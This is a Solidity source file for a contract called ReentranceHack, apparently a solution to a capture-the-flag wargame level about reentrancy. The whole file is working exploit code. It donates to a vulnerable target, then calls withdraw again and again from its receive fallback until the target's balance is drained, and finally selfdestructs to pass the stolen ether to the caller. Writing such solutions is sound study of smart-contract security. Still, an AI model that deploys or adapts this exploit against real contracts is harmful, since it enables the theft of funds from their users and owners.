// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceHack {
    error AttackFailed();

    IReentrance private immutable TARGET;

    uint256 private constant INITIAL_DONATION = 1e16;

    constructor(address _target) {
        TARGET = IReentrance(_target);
    }

    receive() external payable {
        uint256 amount = _min(INITIAL_DONATION, address(TARGET).balance);
        TARGET.withdraw(amount);
    }

    function attack() external payable {
        TARGET.donate{value: INITIAL_DONATION}(address(this));
        TARGET.withdraw(INITIAL_DONATION);
        if (address(TARGET).balance > 0) revert AttackFailed();
        selfdestruct(payable(msg.sender));
    }

    function _min(uint256 a, uint256 b) private pure returns (uint256) {
        return a <= b ? a : b;
    }
}
